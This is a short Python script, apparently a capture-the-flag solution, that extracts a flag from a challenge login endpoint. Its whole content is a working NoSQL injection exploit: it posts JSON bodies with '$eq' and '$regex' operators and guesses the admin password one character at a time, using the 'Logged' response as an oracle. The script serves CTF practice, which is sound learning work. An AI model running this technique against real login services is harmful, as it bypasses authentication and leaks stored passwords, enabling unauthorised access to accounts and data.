#!/usr/bin/python3

import requests, string
from pwn import info,success

headers = {"User-Agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0", "Content-Type" : "application/json"}
url = "http://challs.ctf.cafe:9999/login"

chars = string.ascii_uppercase + string.digits + "_"

flag = "RUSH{"
counter = 0
while True:

    if counter == len(chars):
        success(f"We got it boys: {flag + '}'}")
        break

    payload = flag + chars[counter]
    data = '{"username" : {"$eq" : "admin"}, "password" : {"$regex" : "^%s.*}"}}' % payload
    r = requests.post(url, headers=headers, data=data)
    info(f"Trying password : ^{payload}")
    if 'Logged' in r.text:
        flag += chars[counter]
        counter = 0
    else:
        counter += 1